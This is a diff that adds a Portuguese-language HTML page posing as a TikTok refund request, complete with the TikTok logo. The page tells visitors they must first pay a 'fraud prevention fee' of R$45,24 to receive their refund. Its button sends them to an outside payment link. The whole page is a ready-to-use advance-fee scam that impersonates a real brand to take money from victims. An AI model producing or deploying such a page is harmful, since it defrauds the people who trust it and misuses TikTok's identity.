@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitação de Reembolso</title>
+    <style>
+        body {font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #000; color: #fff;}
+        .container {text-align: center; padding: 20px; border: 1px solid #ccc; border-radius: 10px; box-shadow: 2px 2px 12px rgba(0, 0, 0, 0.1); width: 100%; max-width: 600px; background-color: #000; color: #fff; position: relative;}
+        h2 {font-size: 37px; margin-bottom: 20px; color: #fff;}
+        .note {font-size: 24px; background-color: #000; color: #fff; padding: 20px; border: 1px solid #ddd; border-radius: 10px; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 20px;}
+        button {font-size: 18px; padding: 15px; margin-top: 20px; width: 100%; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;}
+        button:hover {background-color: #45a049;}
+        img {width: 100%; max-width: 300px; height: auto;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="2fa26c9dd31ce860dc627e5375f58a98.png" alt="TikTok Logo">
+        <h2>Solicitação de Reembolso do TikTok</h2>
+        <div class="note">
+            <p><strong>Importante:</strong> Para processar seu reembolso, é necessário pagar uma taxa de prevenção contra fraudes de R$45,24. Não se preocupe, esse valor será reembolsado junto com o valor do reembolso. Como desculpas pelo desconforto, também enviaremos o saldo pendente na plataforma.</p>
+        </div>
+        <form id="refundForm">
+            <button type="submit">Preencher dados para o reembolso</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById("refundForm").addEventListener("submit", function(event) {
+            event.preventDefault(); window.location.href = "https://go.zeroonepay.com.br/su41qtnlxb";
+        });
+    </script>
+</body>
+</html>
